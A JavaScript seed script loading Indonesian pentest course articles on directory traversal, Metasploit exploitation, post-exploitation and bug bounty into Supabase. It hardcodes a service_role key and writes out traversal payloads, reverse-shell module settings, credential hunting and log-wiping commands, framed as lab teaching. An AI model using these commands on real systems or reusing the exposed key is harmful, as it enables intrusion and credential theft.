const { createClient } = require("../node_modules/@supabase/supabase-js");
const supabase = createClient(
  "https://lpzjaorzhxqespuojsjo.supabase.co",
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imxwemphb3J6aHhxZXNwdW9qc2pvIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3Nzg1OTMwMiwiZXhwIjoyMDkzNDM1MzAyfQ.JstoOavT0dmEIErayl6p-I8BhymJbJCZ2_ShNFl2_qE"
);

const codeBlock = (code, color = "#A8FF78") =>
  `<pre style="background:#1E1E1E;color:${color};padding:0.75rem 1rem;border-radius:8px;font-size:0.85rem;overflow-x:auto;margin:0.4rem 0 0.75rem;">${code}</pre>`;

const card = (content) =>
  `<div style="border:1px solid #F0E8D8;border-radius:12px;padding:1.2rem;margin:0.75rem 0;">${content}</div>`;

const note = (content, color = "#F0F7E8", border = "#7AB648") =>
  `<div style="background:${color};border-left:4px solid ${border};padding:0.7rem 0.9rem;border-radius:0 8px 8px 0;margin:0.75rem 0;"><p style="margin:0;font-size:0.85rem;">${content}</p></div>`;

const TARGET_BOX = (url, desc) => `
<div style="background:#1E1E1E;border-radius:12px;padding:1rem 1.2rem;margin-bottom:1.5rem;">
  <p style="margin:0 0 0.3rem;font-size:0.8rem;color:#888;">🎯 TARGET / PLATFORM LATIHAN</p>
  <p style="margin:0;font-size:0.95rem;font-weight:800;color:#A8FF78;font-family:monospace;">${url}</p>
  <p style="margin:0.3rem 0 0;font-size:0.78rem;color:#666;">${desc}</p>
</div>`;

const articles = [

// ── VID 14: Directory Traversal ──────────────────────────────────────────
{
  title: "📁 Directory Traversal & File Inclusion",
  module_index: 4,
  order_index: 4,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">📁 Directory Traversal & File Inclusion</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Versi artikel dari Video 14. Teknik sederhana yang bisa membaca file sensitif langsung dari server.</p>
${TARGET_BOX("portswigger.net/web-security/file-path-traversal", "PortSwigger Web Security Academy — labs gratis, butuh akun.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.5rem;">Konsep: Cara Kerja Directory Traversal</h3>
<p style="font-size:0.9rem;">Server sering menyajikan file berdasarkan parameter dari user. Misalnya URL gambar produk:</p>
${codeBlock(`/image?filename=product1.jpg`)}
<p style="font-size:0.9rem;">Di balik layar server melakukan sesuatu seperti:</p>
${codeBlock(`fopen("/var/www/app/images/" + filename)`, "#FFD700")}
<p style="font-size:0.9rem;">Jika tidak ada validasi, kita bisa manipulasi <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">filename</code> untuk keluar dari direktori yang dimaksud menggunakan <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">../</code> (parent directory).</p>

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">🔬 Demo 1: Simple Path Traversal</h3>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">Lab: File path traversal, simple case</p>
<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.5rem;">Buka lab di PortSwigger → Access the lab</li>
<li style="margin-bottom:0.5rem;">Klik kanan gambar produk → Inspect → lihat URL gambar di src attribute</li>
<li style="margin-bottom:0.5rem;">URL gambar: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/image?filename=53.jpg</code></li>
<li style="margin-bottom:0.5rem;">Ubah filename menjadi:<br/>${codeBlock(`/image?filename=../../../etc/passwd`)}<br/><em style="font-size:0.82rem;color:#666;"><code>../</code> tiga kali = naik 3 level dari direktori images ke root sistem</em></li>
<li>Isi file <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/etc/passwd</code> muncul di browser ✓</li>
</ol>`)}

<h3 style="color:#2D5016;font-size:1.05rem;font-weight:800;margin:1.5rem 0 0.75rem;">File Target yang Sensitif di Linux</h3>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">File</th><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Isi</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-family:monospace;">/etc/passwd</td><td style="padding:0.5rem 0.8rem;">Daftar user sistem</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-family:monospace;">/etc/shadow</td><td style="padding:0.5rem 0.8rem;">Password hash (butuh root)</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-family:monospace;">/etc/hosts</td><td style="padding:0.5rem 0.8rem;">Internal hostname mapping</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-family:monospace;">~/.ssh/id_rsa</td><td style="padding:0.5rem 0.8rem;">Private key SSH</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-family:monospace;">/var/log/apache2/access.log</td><td style="padding:0.5rem 0.8rem;">Log akses web server</td></tr>
<tr style="background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-family:monospace;">/proc/self/environ</td><td style="padding:0.5rem 0.8rem;">Environment variable proses saat ini</td></tr>
</tbody></table>

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">🔬 Demo 2: Bypassing Filter</h3>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">Ketika <code style="background:#1E1E1E;color:#A8FF78;padding:0.1rem 0.4rem;border-radius:4px;">../</code> di-strip oleh server</p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;">Jika server menghapus <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">../</code> dari input, coba nested:</p>
${codeBlock(`/image?filename=....//....//....//etc/passwd`)}
<p style="margin:0 0 0.5rem;font-size:0.87rem;"><strong>Cara kerjanya:</strong> setelah strip <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">../</code> dari <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">....//</code> hasilnya tetap <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">../</code></p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;"><strong>URL encoded:</strong></p>
${codeBlock(`/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`)}
<p style="margin:0;font-size:0.87rem;"><strong>Double encoding:</strong></p>
${codeBlock(`/image?filename=%252e%252e%252f%252e%252e%252fetc%252fpasswd`)}`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">🔬 Demo 3: Local File Inclusion (LFI)</h3>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">LFI vs Path Traversal</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;">Path Traversal: server <em>mengirimkan</em> isi file ke browser.<br/>LFI: server <em>mengeksekusi</em> file tersebut sebagai kode (PHP/script).</p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;">Contoh URL yang vulnerable:</p>
${codeBlock(`/index.php?page=contact`)}
<p style="margin:0 0 0.5rem;font-size:0.87rem;">Di balik layar: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">include($_GET['page'] . '.php')</code></p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;">Payload null byte (PHP &lt; 5.3.4):</p>
${codeBlock(`/index.php?page=../../etc/passwd%00`)}
<p style="margin:0 0 0.5rem;font-size:0.87rem;"><code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">%00</code> (null byte) memotong string — ekstensi <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">.php</code> di-ignore, server baca <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">/etc/passwd</code> saja.</p>
${note("⭐ <strong>Log Poisoning:</strong> inject PHP code ke dalam log server via User-Agent header, lalu include file log. Hasilnya: Remote Code Execution dari LFI.", "#FFF3D6", "#F5A62A")}`)}

${note("🎯 <strong>Next step:</strong> Video 15 — Exploitation dengan Metasploit. Kita pakai framework paling populer di dunia untuk exploit sistem target di lab.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── VID 15: Metasploit ───────────────────────────────────────────────────
{
  title: "💥 Exploitation Basics — Metasploit Introduction",
  module_index: 5,
  order_index: 0,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">💥 Exploitation Basics — Metasploit Introduction</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Versi artikel dari Video 15. Kita exploit vulnerability nyata di Metasploitable 2 menggunakan Metasploit Framework.</p>
${TARGET_BOX("Metasploitable 2 di VirtualBox (192.168.56.101)", "Mesin virtual yang memang dirancang untuk dieksploitasi. Pastikan VirtualBox sudah running dari Video Setup Lab.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Step 1: Verifikasi Target</h3>
${card(`<ol style="margin:0;padding-left:1.2rem;font-size:0.87rem;">
<li style="margin-bottom:0.5rem;">Nyalakan Metasploitable 2 di VirtualBox — login: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">msfadmin / msfadmin</code></li>
<li style="margin-bottom:0.5rem;">Cek IP: <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">ifconfig</code> — catat IP (biasanya 192.168.56.101)</li>
<li style="margin-bottom:0.5rem;">Dari terminal Kali, scan target:${codeBlock(`nmap -sV 192.168.56.101`)}</li>
<li>Catat service dan versi yang ditemukan</li>
</ol>`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Step 2: Buka Metasploit Console</h3>
${codeBlock(`msfconsole`)}
<p style="font-size:0.88rem;">Tunggu banner. Kamu sekarang di <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">msf6 &gt;</code></p>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">Perintah dasar Metasploit</p>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.4rem 0.7rem;text-align:left;color:#2D5016;">Command</th><th style="padding:0.4rem 0.7rem;text-align:left;color:#2D5016;">Fungsi</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">search &lt;keyword&gt;</td><td style="padding:0.4rem 0.7rem;">Cari modul berdasarkan kata kunci</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">use &lt;modul&gt;</td><td style="padding:0.4rem 0.7rem;">Pilih modul</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">show options</td><td style="padding:0.4rem 0.7rem;">Tampilkan opsi yang perlu diset</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">set &lt;OPTION&gt; &lt;value&gt;</td><td style="padding:0.4rem 0.7rem;">Set nilai opsi</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">run / exploit</td><td style="padding:0.4rem 0.7rem;">Jalankan modul</td></tr>
<tr style="background:#FAFAF8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">sessions -l</td><td style="padding:0.4rem 0.7rem;">List semua session aktif</td></tr>
</tbody></table>`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">🔬 Demo: vsftpd 2.3.4 Backdoor</h3>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">CVE-2011-2523 — CVSS 10.0 Critical</p>
<p style="margin:0 0 0.75rem;font-size:0.87rem;">vsftpd 2.3.4 mengandung backdoor yang sengaja dimasukkan oleh penyerang yang berhasil compromise repositorinya tahun 2011. Trigger backdoor dengan mengirim username yang mengandung karakter <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">:)</code> — membuka shell di port 6200.</p>
${codeBlock(`search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.56.101
run`)}
<p style="margin:0.5rem 0 0;font-size:0.87rem;">Output yang diharapkan:</p>
${codeBlock(`[*] Banner: 220 (vsFTPd 2.3.4)
[+] Backdoor service has been spawned, handling...
[*] Found shell.
[*] Command shell session 1 opened`, "#A8FF78")}
<p style="margin:0.5rem 0 0;font-size:0.87rem;">Setelah dapat shell:</p>
${codeBlock(`whoami    # → root
id        # → uid=0(root) gid=0(root)
hostname  # → metasploitable`)}`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">🔬 Demo: Meterpreter Session</h3>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">Metasploitable 2 — Samba exploit dengan Meterpreter</p>
${codeBlock(`search samba usermap
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set payload cmd/unix/reverse
set LHOST [IP Kali kamu]
set LPORT 4444
run`)}
<p style="margin:0.5rem 0 0.5rem;font-weight:800;color:#2D5016;">Perintah Meterpreter yang berguna:</p>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.4rem 0.7rem;text-align:left;color:#2D5016;">Perintah</th><th style="padding:0.4rem 0.7rem;text-align:left;color:#2D5016;">Fungsi</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">sysinfo</td><td style="padding:0.4rem 0.7rem;">Info OS dan hostname</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">getuid</td><td style="padding:0.4rem 0.7rem;">User saat ini</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">hashdump</td><td style="padding:0.4rem 0.7rem;">Dump password hash</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">ps</td><td style="padding:0.4rem 0.7rem;">List proses berjalan</td></tr>
<tr style="background:#F0E8D8;"><td style="padding:0.4rem 0.7rem;font-family:monospace;">shell</td><td style="padding:0.4rem 0.7rem;">Masuk ke shell sistem</td></tr>
</tbody></table>`)}

${note("⚠️ <strong>Ingat:</strong> Semua yang ada di video ini hanya dilakukan di Metasploitable 2 — mesin virtual lokal yang kamu sendiri yang buat. Jangan pernah jalankan exploit ke sistem yang bukan milik kamu.", "#FFF5F5", "#E53935")}
${note("🎯 <strong>Next step:</strong> Video 16 — Post-Exploitation. Setelah dapat akses, apa yang dilakukan pentester — dan bagaimana defender mendeteksinya.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── VID 16: Post-Exploitation ─────────────────────────────────────────────
{
  title: "🕵️ Post-Exploitation & Covering Tracks (Defensive View)",
  module_index: 5,
  order_index: 1,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">🕵️ Post-Exploitation & Covering Tracks (Defensive View)</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Versi artikel dari Video 16. Apa yang dilakukan penyerang setelah masuk — dan bagaimana defender mendeteksinya.</p>
${TARGET_BOX("Metasploitable 2 (192.168.56.101) — Meterpreter session dari Video 15", "Pastikan masih ada active session dari lab sebelumnya, atau ulangi exploit dari awal.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Phase 1: Enumerasi Setelah Masuk</h3>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">Dari shell/Meterpreter — kenali lingkungan</p>
${codeBlock(`# Info sistem
uname -a          # OS version dan kernel
hostname          # nama mesin
id                # siapa kita sekarang
whoami

# User dan grup
cat /etc/passwd   # semua user sistem
cat /etc/group    # grup dan anggotanya
last              # siapa yang terakhir login

# Jaringan
ifconfig          # semua interface dan IP
netstat -antup    # koneksi aktif dan listening ports
cat /etc/hosts    # hostname internal

# File sensitif
find / -name "*.conf" 2>/dev/null   # konfigurasi
find / -name ".env" 2>/dev/null     # environment variables
find / -name "id_rsa" 2>/dev/null   # SSH private key
history                              # command history user`)}
<p style="margin:0;font-size:0.82rem;color:#666;">File <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">.env</code> dan <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">*.conf</code> sering berisi database credentials dan API key.</p>`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Phase 2: Privilege Escalation</h3>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">Jika masuk bukan sebagai root</p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;">Cek SUID binaries:</p>
${codeBlock(`find / -perm -u=s -type f 2>/dev/null`)}
<p style="margin:0 0 0.5rem;font-size:0.87rem;">SUID binary berjalan dengan privilege pemiliknya (root). Kalau ada binary rentan, bisa digunakan untuk dapat shell root.</p>
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;">Cek sudo permissions:</p>
${codeBlock(`sudo -l`)}
<p style="margin:0 0 0.5rem;font-size:0.87rem;">Jika muncul <code style="background:#F0E8D8;padding:0.1rem 0.3rem;border-radius:4px;">(ALL) NOPASSWD: /usr/bin/vim</code> — dapat root shell dengan:</p>
${codeBlock(`sudo vim -c ':!/bin/bash'`)}
<p style="margin:0 0 0.5rem;font-size:0.87rem;font-weight:700;">Cek kernel version (kernel exploits):</p>
${codeBlock(`uname -r
searchsploit linux kernel [versi]`)}`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Phase 3: Lateral Movement</h3>
${card(`<p style="margin:0 0 0.5rem;font-size:0.87rem;">Setelah kompromis satu mesin, penyerang sering pivot ke mesin lain di jaringan yang sama:</p>
${codeBlock(`# Scan jaringan internal dari dalam mesin yang sudah dikuasai
nmap -sn 192.168.56.0/24

# Ambil SSH key untuk dipakai ke mesin lain
cat ~/.ssh/id_rsa
cat ~/.ssh/known_hosts   # mesin mana yang pernah di-SSH dari sini

# Ambil stored credentials
cat ~/.bash_history | grep -i pass
cat ~/.bash_history | grep -i ssh`)}
${note("Ini kenapa <strong>network segmentation</strong> penting — pisahkan jaringan production dari development dari internal tools. Satu breach tidak harus jadi pivot ke seluruh infrastruktur.", "#FFF3D6", "#F5A62A")}`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Phase 4: Covering Tracks — Dan Cara Mendeteksinya</h3>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">Yang dilakukan penyerang</p>
${codeBlock(`# Hapus command history
history -c
cat /dev/null > ~/.bash_history
unset HISTFILE

# Hapus log (jika punya akses)
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog

# Modifikasi timestamp file agar tidak terdeteksi
touch -t 202001010000 /path/to/file`)}
<p style="margin:0.75rem 0 0.5rem;font-weight:800;color:#E53935;">⚔️ Cara Defender Mendeteksinya</p>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Kontrol</th><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Cara Kerja</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Centralized Logging (SIEM)</td><td style="padding:0.5rem 0.8rem;">Log dikirim ke server terpisah real-time — hapus log lokal tidak berguna</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">File Integrity Monitoring</td><td style="padding:0.5rem 0.8rem;">AIDE/Tripwire deteksi perubahan file system</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">auditd</td><td style="padding:0.5rem 0.8rem;">Rekam setiap perintah yang dijalankan, termasuk oleh root</td></tr>
<tr style="background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Anomaly Detection</td><td style="padding:0.5rem 0.8rem;">Alert jika ada login jam aneh, akses ke file sensitif, atau privilege escalation</td></tr>
</tbody></table>`)}

${note("🎯 <strong>Next step:</strong> Video 17 — Bug Bounty. Cara menggunakan semua skill ini untuk mendapatkan bayaran secara legal.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── VID 17: Bug Bounty ───────────────────────────────────────────────────
{
  title: "💰 Intro ke Bug Bounty — Cara Mulai Dapat Bayaran",
  module_index: 6,
  order_index: 0,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">💰 Intro ke Bug Bounty — Cara Mulai Dapat Bayaran</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Versi artikel dari Video 17. Gunakan skill yang sudah kamu pelajari untuk mendapat bayaran secara legal dari perusahaan besar.</p>
${TARGET_BOX("hackerone.com + bugcrowd.com", "Platform bug bounty terbesar di dunia. Daftar akun gratis di keduanya.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.5rem;">Apa itu Bug Bounty?</h3>
<p style="font-size:0.9rem;">Perusahaan membayar kamu untuk menemukan celah keamanan di sistem mereka <strong>sebelum penyerang nyata menemukannya</strong>. Program ini legal sepenuhnya — kamu mendapat izin eksplisit dalam ruang lingkup tertentu.</p>
${card(`<p style="margin:0 0 0.75rem;font-weight:800;color:#2D5016;">Perusahaan yang punya program bug bounty</p>
<div style="display:flex;flex-wrap:wrap;gap:0.5rem;">
${["Apple","Google","Microsoft","Facebook","Twitter","Tokopedia","Gojek","Traveloka","HackerOne","Shopify","Airbnb","Uber"].map(c => `<span style="background:#F0E8D8;padding:0.2rem 0.6rem;border-radius:6px;font-size:0.82rem;font-weight:700;">${c}</span>`).join("")}
</div>`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Cara Membaca Program</h3>
${card(`<p style="margin:0 0 0.5rem;font-weight:800;color:#2D5016;">Bagian penting dalam setiap program</p>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Bagian</th><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Artinya</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Scope</td><td style="padding:0.5rem 0.8rem;">Domain atau fitur yang boleh di-test</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;color:#E53935;">Out of Scope</td><td style="padding:0.5rem 0.8rem;">Yang TIDAK boleh disentuh — test di sini = banned</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Reward Range</td><td style="padding:0.5rem 0.8rem;">Berapa yang dibayar per severity level</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Response SLA</td><td style="padding:0.5rem 0.8rem;">Berapa lama program merespon laporan</td></tr>
<tr style="background:#F0E8D8;"><td style="padding:0.5rem 0.8rem;font-weight:700;">Safe Harbor</td><td style="padding:0.5rem 0.8rem;">Perlindungan hukum jika kamu ikuti aturan scope</td></tr>
</tbody></table>`)}

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">💸 Reward Berdasarkan Severity</h3>
<table style="width:100%;border-collapse:collapse;font-size:0.83rem;">
<thead><tr style="background:#F0E8D8;"><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Vulnerability</th><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Reward (estimasi)</th><th style="padding:0.5rem 0.8rem;text-align:left;color:#2D5016;">Kesulitan</th></tr></thead>
<tbody>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;">Information Disclosure</td><td style="padding:0.5rem 0.8rem;">Rp 500K – 3 juta</td><td style="padding:0.5rem 0.8rem;">⭐ Very Low</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;">XSS (Reflected)</td><td style="padding:0.5rem 0.8rem;">Rp 500K – 3 juta</td><td style="padding:0.5rem 0.8rem;">⭐ Low</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;">IDOR</td><td style="padding:0.5rem 0.8rem;">Rp 1 – 10 juta</td><td style="padding:0.5rem 0.8rem;">⭐⭐ Low–Medium</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;">XSS (Stored)</td><td style="padding:0.5rem 0.8rem;">Rp 2 – 15 juta</td><td style="padding:0.5rem 0.8rem;">⭐⭐ Low–Medium</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;">Auth Bypass</td><td style="padding:0.5rem 0.8rem;">Rp 5 – 50 juta</td><td style="padding:0.5rem 0.8rem;">⭐⭐⭐ Medium</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;background:#FAFAF8;"><td style="padding:0.5rem 0.8rem;">SQL Injection</td><td style="padding:0.5rem 0.8rem;">Rp 5 – 100 juta</td><td style="padding:0.5rem 0.8rem;">⭐⭐⭐ Medium–High</td></tr>
<tr style="border-bottom:1px solid #F0E8D8;"><td style="padding:0.5rem 0.8rem;">SSRF</td><td style="padding:0.5rem 0.8rem;">Rp 10 – 100 juta</td><td style="padding:0.5rem 0.8rem;">⭐⭐⭐⭐ High</td></tr>
<tr style="background:#FFF5F5;"><td style="padding:0.5rem 0.8rem;font-weight:800;color:#E53935;">RCE</td><td style="padding:0.5rem 0.8rem;font-weight:800;color:#E53935;">Rp 50 – 500 juta+</td><td style="padding:0.5rem 0.8rem;">⭐⭐⭐⭐⭐ Very High</td></tr>
</tbody></table>

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">🗺️ Metodologi Bug Bounty Pemula</h3>
<ol style="font-size:0.9rem;margin:0 0 0 1.2rem;">
<li style="margin-bottom:0.5rem;"><strong>Pilih satu program</strong> — VDP dulu, jangan langsung private program</li>
<li style="margin-bottom:0.5rem;"><strong>Baca scope dengan teliti</strong> — tandai out of scope, jangan pernah test di sana</li>
<li style="margin-bottom:0.5rem;"><strong>Recon</strong> — subdomain enum, endpoint discovery, parameter mapping</li>
<li style="margin-bottom:0.5rem;"><strong>Test secara manual</strong> — cari IDOR dulu (ganti ID di URL), lalu XSS di form input</li>
<li style="margin-bottom:0.5rem;"><strong>Dokumentasikan semuanya</strong> — screenshot setiap langkah</li>
<li><strong>Submit laporan yang jelas</strong> — title, severity, steps to reproduce, impact, proof of concept</li>
</ol>

${note("⭐ <strong>Tips untuk pemula:</strong> Fokus ke <strong>IDOR</strong> dan <strong>information disclosure</strong> dulu. Banyak, sering terlewat oleh researcher lain, dan cukup mudah untuk didokumentasikan dengan laporan yang jelas.", "#FFF3D6", "#F5A62A")}
${note("🎯 <strong>Next step:</strong> Video 18 — Cara membaca dan menulis laporan pentest profesional.", "#F0F7E8", "#7AB648")}
</div>`
},

// ── VID 18: Pentest Report ───────────────────────────────────────────────
{
  title: "📄 Cara Baca Laporan Pentest Profesional",
  module_index: 6,
  order_index: 1,
  content: `<div style="font-family:inherit;line-height:1.75;color:#333;">
<h2 style="color:#2D5016;font-size:1.4rem;font-weight:800;margin-bottom:0.5rem;">📄 Cara Baca Laporan Pentest Profesional</h2>
<p style="color:#666;font-size:0.9rem;margin-bottom:1.5rem;">Versi artikel dari Video 18. Laporan yang baik adalah yang membuat temuan teknis bisa dipahami dan diaksi oleh semua pihak.</p>
${TARGET_BOX("github.com/juliocesarfort/public-pentesting-reports", "Repository berisi ratusan laporan pentest asli yang sudah dipublikasikan secara resmi. Gratis, bisa langsung dipelajari.")}
<hr style="border:none;border-top:2px solid #F0E8D8;margin:1.5rem 0;" />

<h3 style="color:#2D5016;font-size:1.1rem;font-weight:800;margin:1.5rem 0 0.75rem;">Struktur Laporan Pentest Standar</h3>
